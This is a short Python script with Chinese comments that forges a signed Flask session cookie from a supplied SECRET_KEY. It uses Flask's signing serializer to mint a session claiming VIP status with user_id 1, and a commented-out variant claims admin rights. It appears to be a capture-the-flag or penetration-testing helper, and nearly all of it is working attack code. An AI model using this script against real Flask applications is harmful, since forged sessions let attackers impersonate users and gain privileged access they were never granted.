import requests
import re,sys
from flask.sessions import SecureCookieSessionInterface
#target = f'http://%s:%s'%(sys.argv[1],sys.argv[2]) #从命令行参数中获取目标的 IP 地址和端口号，并拼接成目标 URL。

# response = requests.get(url)
# page_content = response.text

secret_key = input("Please enter the secret key: ")

#创建一个模拟的 Flask 应用对象并设置 SECRET_KEY：
class App(object):  
    def __init__(self):
        self.secret_key = None
app = App()  
app.secret_key = secret_key

#生成一个伪造的会话 cookie：
si = SecureCookieSessionInterface()  #创建一个 SecureCookieSessionInterface 实例
serializer = si.get_signing_serializer(app)  # 签名序列化器
#session = serializer.dumps({'is_admin':True})  
# 使用签名序列化器生成一个包含 {'is_vip': True} 的会话数据，并将其序列化为一个字符串（伪造的 session）。
session = serializer.dumps({'is_vip': True, 'csrf_token': 'f2371f61b473661acde01b81a43e2421e499f472', 'user_id': 1}) 
print(session)


